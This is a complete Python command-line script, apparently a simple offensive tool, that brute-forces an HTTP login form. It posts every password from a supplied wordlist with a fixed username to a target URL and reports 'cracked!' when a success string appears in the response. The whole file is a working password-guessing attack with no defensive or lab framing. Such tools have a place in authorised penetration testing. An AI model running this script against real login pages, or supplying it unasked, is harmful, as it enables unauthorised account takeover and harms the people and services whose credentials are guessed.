#!/usr/bin/env python3

import click
import requests
import logging


@click.command()
@click.argument('url')
@click.argument('username')
@click.argument('password_file', type=click.File())
@click.argument('success_string')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose output')
def http_brute(url, username, password_file, success_string, verbose):

    if verbose:
        logging.basicConfig(level=logging.INFO)
    else:
        logging.basicConfig(level=logging.ERROR)

    passwords = password_file.read().split('\n')
    password_file.close()

    for password in passwords:
        response = requests.post(url, data = {'username': username, 'password': password})
        logging.info('{} {} {}'.format(username, password, response.status_code))
        if success_string in response.text:
            print('cracked!', username, password)
            break


if __name__ == '__main__':
    http_brute()
